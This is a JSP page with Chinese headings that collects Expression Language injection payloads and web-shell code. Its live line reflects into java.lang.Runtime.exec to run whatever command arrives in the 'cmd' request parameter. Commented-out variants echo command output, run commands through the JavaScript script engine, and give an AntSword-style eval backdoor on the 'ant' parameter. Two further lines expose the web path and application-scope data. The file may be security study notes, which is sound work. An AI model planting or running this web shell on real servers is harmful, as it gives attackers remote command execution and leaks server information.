<%@ page language="java" contentType="text/html; charset=utf-8" pageEncoding="utf-8" %>
<h1> EL 写法 </h1>

<%--<h1>反射构造Runtime</h1>--%>
<%--${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"whoami")}--%>
<h1>反射构造Runtime - 外界参数</h1>
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),pageContext.request.getParameter("cmd"))}

<%--<h1>命令执行回显 Ref: https://forum.butian.net/share/886</h1>--%>
<%--${pageContext.setAttribute("inputStream", Runtime.getRuntime().exec("ifconfig").getInputStream());Thread.sleep(1000);pageContext.setAttribute("inputStreamAvailable", pageContext.getAttribute("inputStream").available());pageContext.setAttribute("byteBufferClass", Class.forName("java.nio.ByteBuffer"));pageContext.setAttribute("allocateMethod", pageContext.getAttribute("byteBufferClass").getMethod("allocate", Integer.TYPE));pageContext.setAttribute("heapByteBuffer", pageContext.getAttribute("allocateMethod").invoke(null, pageContext.getAttribute("inputStreamAvailable")));pageContext.getAttribute("inputStream").read(pageContext.getAttribute("heapByteBuffer").array(), 0, pageContext.getAttribute("inputStreamAvailable"));pageContext.setAttribute("byteArrType", pageContext.getAttribute("heapByteBuffer").array().getClass());pageContext.setAttribute("stringClass", Class.forName("java.lang.String"));pageContext.setAttribute("stringConstructor", pageContext.getAttribute("stringClass").getConstructor(pageContext.getAttribute("byteArrType")));pageContext.setAttribute("stringRes", pageContext.getAttribute("stringConstructor").newInstance(pageContext.getAttribute("heapByteBuffer").array()));pageContext.getAttribute("stringRes")}--%>

<%--<h1>JS引擎</h1>--%>
<%--${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('whoami')")}--%>
<%--<h1>JS引擎 - 回显</h1>--%>
<%--${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("var runtime = java.lang./**/Runtime./**/getRuntime();var process = runtime.exec(\"hostname\");var inputStream = process.getInputStream();var scanner = new java.util.Scanner(inputStream,\"GBK\").useDelimiter(\"\\\\A\");var result = scanner.hasNext() ? scanner.next() : \"\";scanner.close();result;")}--%>

<%--<h1>蚁剑</h1>--%>
<%--<%out.print(org.apache.jasper.runtime.PageContextImpl.proprietaryEvaluate(request.getParameter("ant"), String.class, pageContext, null));%>--%>

<h1>web路径</h1>
${pageContext.servletContext.getResource("")}

<h1>环境变量</h1>
${applicationScope}